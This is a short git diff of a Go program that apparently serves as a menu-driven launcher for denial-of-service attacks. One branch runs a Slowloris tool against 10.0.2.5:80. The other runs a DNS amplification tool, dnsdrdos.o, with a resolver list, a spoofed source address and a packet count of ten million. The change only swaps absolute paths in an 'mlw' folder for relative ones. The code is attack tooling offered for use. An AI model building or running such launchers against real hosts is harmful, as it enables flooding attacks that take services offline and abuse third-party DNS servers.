@@ -16,14 +16,14 @@ func main() {
 	switch x {
 	case 1:
 		fmt.Println("------------------------Starting Slowloris Attack------------------------")
-		out, err := exec.Command("python3", "/home/marti/Desktop/mlw/slowloris.py").Output()
+		out, err := exec.Command("./slowloris", "10.0.2.5:80").Output()
 		if err != nil {
 			log.Fatal(err)
 		}
 		fmt.Println(string(out))
 	case 2:
 		fmt.Println("------------------------Starting DNS Amplification Attack------------------------")
-		out, err := exec.Command("/home/marti/Desktop/mlw/dnsdrdos.o", "-f", "/home/marti/Desktop/mlw/DNSlist.txt", "-s", "10.0.2.5", "-l", "10000000").Output()
+		out, err := exec.Command("./dnsdrdos.o", "-f", "./DNSlist.txt", "-s", "10.0.2.5", "-l", "10000000").Output()
 		if err != nil {
 			log.Fatal(err)
 		}
